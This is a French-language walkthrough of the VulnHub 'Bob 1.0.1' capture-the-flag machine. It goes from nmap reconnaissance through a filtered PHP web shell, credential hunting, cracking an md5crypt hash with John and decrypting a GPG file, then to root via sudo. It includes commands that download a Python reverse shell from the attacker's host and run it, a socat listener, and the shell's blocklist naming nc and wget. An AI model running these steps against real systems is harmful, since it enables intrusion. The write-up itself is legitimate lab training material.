# Solution du CTF Bob: 1.0.1 de VulnHub

[Bob](https://www.vulnhub.com/entry/bob-101,226/) est le premier CTF proposé par *c0rruptedb1t* sur VulnHub.  

Le synopsis est que le *Milburg Highschool* a subit une intrusion de ses machines Windows et a décidé de passer sous Linux.  

Objectif: vérifier la sécurité du système, obtenir les privilèges root et obtenir le flag présent à la racine.  

Préface
-------

```plain
Nmap scan report for 192.168.2.5
Host is up (0.00057s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     ProFTPD 1.3.5b
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 4 disallowed entries
| /login.php /dev_shell.php /lat_memo.html
|_/passwords.html
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 84:f2:f8:e5:ed:3e:14:f3:93:d4:1e:4c:41:3b:a2:a9 (RSA)
|_  256 5b:98:c7:4f:84:6e:fd:56:6a:35:16:83:aa:9c:ea:f8 (ECDSA)
MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Le site web a des liens non cliquables, ce qui n'est pas une difficulté en soit (on peut par exemple passer par les dev-tools pour les suivre).  

Dans les pages on peut trouver différents commentaires comme ce dernier qui était encodé en base64 :  

> In other news some dumbass made a file called passwords.html, completely braindead  
> 
> -Bob

Ou dans la page de login :  

> If you are the new IT staff I have sent a letter to you about a web shell you can use  
> 
> -Bob

et dans le fichier *passwords.html* cité :  

> N.T.S Get Sticky Notes to Write Passwords in  
> 
> -Bob

Porte dérobée
-------------

Sur l'URL */dev\_shell.php* on a un shell PHP très basique.  

Ce dernier semble filtrer les commandes et on obtient par exemple le message *Get out skid lol* si on rentre *ls*. D'autres commandes ne retournent pas d'output, difficile alors de dire si la commande est absente ou si c'est le shell qui nous filtre. Dans tous les cas un *sleep 10* provoque bien une temporisation, signe que les commandes sont bien exécutées.  

Les deux commandes suivantes me permettent de passer de ce webshell à [un shell PTY](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py) plus agréable :  

```bash
/usr/bin/wget http://192.168.2.240:8000/tcp_pty_backconnect.py -O /tmp/backdoor.py
python /tmp/backdoor.py
```

On aura préalablement lancé un listener pty-aware sur notre machine :  

```bash
socat file:`tty`,echo=0,raw tcp4-listen:31337
```

Une fois le shell obtenu on peut jeter un œil (par simple curiosité) aux restrictions qui étaient faites par le shell PHP, comme :  

```php
$bad_words = array("pwd", "ls", "netcat", "ssh", "wget", "ping", "traceroute", "cat", "nc");
```

Sous la racine web on trouve un fichier *.hint* avec le contenu suivant :

```plain
Have you tried spawning a tty shell?
Also don't forget to check for hidden files ;)
```

En mode détective
-----------------

Comme d'habitude on note quelques utilisateurs dans */etc/passwd* :  

```plain
c0rruptedb1t:x:1000:1000:c0rruptedb1t,,,:/home/c0rruptedb1t:/bin/bash
bob:x:1001:1001:Bob,,,,Not the smartest person:/home/bob:/bin/bash
jc:x:1002:1002:James C,,,:/home/jc:/bin/bash
seb:x:1003:1003:Sebastian W,,,:/home/seb:/bin/bash
elliot:x:1004:1004:Elliot A,,,:/home/elliot:/bin/bash
sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
proftpd:x:117:65534::/run/proftpd:/bin/false
ftp:x:118:65534::/srv/ftp:/bin/false
```

Le premier ayant probablement été utilisé uniquement pour mettre en place le challenge, ça ne sert à rien de s'y attarder.  

Dans le dossier personnel de bob, on trouve un fichier *.old\_passwordfile.html* avec des identifiants nous permettant d'avoir un accès SSH :  

```plain
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
```

Note: le serveur SSH écoutant sur un port non standard il faut utiliser les options -p et -P pour respectivement ssh et scp.  

On voit dans le dossier *Downloads* de bob une archive extraite *proftpd-1.3.3c* qui correspond à la version backdoorée par *AcidBitchez* de *ProFTPd*. Pour autant la bannière du FTP en écoute ne correspond pas à cette version... D'ailleurs l'exploitation de la faille (voir [le CTF BasicPentesting](http://devloop.users.sourceforge.net/index.php?article143/solution-du-ctf-basic-pentesting-1-de-vulnhub)) ne fonctionne pas ici.  

Sous un path assez long (*Documents/Secret/Keep\_Out/Not\_Porn/No\_Lookie\_In\_Here/notes.sh*) on trouve différentes notes qui pourraient être des passphrases :  

```bash
#!/bin/bash
clear
echo "-= Notes =-"
echo "Harry Potter is my faviorite"
echo "Are you the real me?"
echo "Right, I'm ordering pizza this is going nowhere"
echo "People just don't get me"
echo "Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh <sea santy here>"
echo "Cucumber"
echo "Rest now your eyes are sleepy"
echo "Are you gonna stop reading this yet?"
echo "Time to fix the server"
echo "Everyone is annoying"
echo "Sticky notes gotta buy em"
```

Or il y a aussi un fichier chiffré *login.txt.gpg* dans le dossier *Documents* de bob mais aucune des passphrases ne fonctionne.  

On trouve aussi un même hash correspondant au mot de passe de bob pour le FTP dans */etc/proftpd/bobftp* et */home/bob/Downloads/.bobftp.bak* :  

```plain
bob:$1$Qiy3X9sL$0U5QdO1kxUaU2CrzXAy8W0:1001:1001::/home/bob:/bin/false
```

Ce dernier se casse facilement :  

```plain
$ /opt/john-1.8.0-jumbo-1/run/john -w /opt/wordlists/rockyou.txt --format=md5crypt /tmp/hash.txt
Loaded 1 password hash (md5crypt, crypt(3) $1$ [MD5 128/128 AVX 12x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Qwerty           (bob)
```

Mais le pass ne fonctionne ni pour FTP, ni pour SSH/su, ni pour déchiffrer le GPG...  

Enfin pour terminer avec bob, il y a des notes dans *Documents/staff.txt* :  

```plain
Seb:

Seems to like Elliot
Wants to do well at his job
Gave me a backdoored FTP to instal that apparently Elliot gave him

James:

Does nothing
Pretty Lazy
Doesn't give a shit about his job

Elliot:

Keeps to himself
Always needs to challenge everything I do
Keep an eye on him
Try and get him fired
```

Besoin d'un indice
------------------

Assez pour bob, intéressons nous aux comptes dont on dispose. En dehors de l'alias embêtant pour *cat* dans les .bashrc (un *unalias* et on n'en parle plus) :  

```bash
alias cat='echo hey \n there'
alias ls='ls --color=auto'
alias testing='echo testing right back at you'
```

il y a des commandes que l'on peut lancer via sudo :  

```plain
User jc may run the following commands on debian-Lab:
    (ALL) NOPASSWD: /usr/bin/service apache2 *
    (root) NOPASSWD: /bin/systemctl start ssh
```

Mais le programme */usr/bin/service* est de toute façon manquant, on ne voit pas comment on pourrait l'exploiter...  

Dans les fichiers d'Elliot il y a cette note :  

> The admin is dumb,  
> 
> In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to  
> 
>   
> 
> theadminisdumb  
> 
>   
> 
> I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.

Une fois de plus le mot de passe ne fonctionne pas...  

J'ai demandé un indice à l'auteur du CTF qui a indiqué de regarder la première lettre de chaque phrase (pour les notes de bob), ce qui donne la clé *HARPOCRATES* qui permet alors de déchiffrer le gpg...  

On obtient alors les identifiants *bob:b0bcat\_* permettant l'accès SSH pour bob puis passer root via sudo.  

```plain
root@debian-Lab:/home/bob# cat /flag.txt
CONGRATS ON GAINING ROOT

        .-.
       (   )
        |~|       _.--._
        |~|~:'--~'      |
        | | :   #root   |
        | | :     _.--._|
        |~|~`'--~'
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks for playing ~c0rruptedb1t
```

Affaire classée
---------------

Assez déçu par ce CTF qui comme d'autres contient différents éléments inutiles... on ne sait pas si l'auteur n'a pas réussi à mettre en place ce qu'il désirait sur le CTF et l'a laissé ou si c'est bien volontaire :(   

Il aurait alors fallut un indice supplémentaire pour garder le focus sur le fichier *notes.sh* car tous ces éléments incitent à regarder ailleurs.  

Et sur le plan cet technique ce CTF n'a pas vraiment d'intérêt :| mais il en faut pour tous les goûts   


*Published March 20 2018 at 13:33*